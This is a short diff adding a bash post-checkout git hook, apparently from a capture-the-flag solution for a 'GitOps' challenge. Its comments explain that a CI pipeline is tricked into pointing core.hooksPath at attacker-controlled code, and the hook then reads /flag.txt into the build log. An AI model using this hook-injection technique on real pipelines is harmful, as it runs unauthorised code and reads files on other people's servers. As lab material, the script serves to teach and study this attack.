@@ -1,0 +1,13 @@
+#!/usr/bin/env bash
+# GitOps -- attacker-controlled git hook.
+#
+# `git clone` runs post-checkout once the working tree is written. The pipeline is
+# tricked into pointing core.hooksPath at THIS directory (see writeup/solve.py), so
+# this script runs on the challenge host, as the web user, after the clone.
+#
+# It only READS the flag and writes it to stdout: the pipeline captures the command
+# output into the build log, which the console page then shows. No reverse shell is
+# needed, which makes the solver work from anywhere (no inbound connection, so it
+# survives NAT) and leaves nothing running on the target.
+echo "=== gitops post-checkout hook ==="
+cat /flag.txt 2>/dev/null || echo "(no /flag.txt readable as $(id -un))"
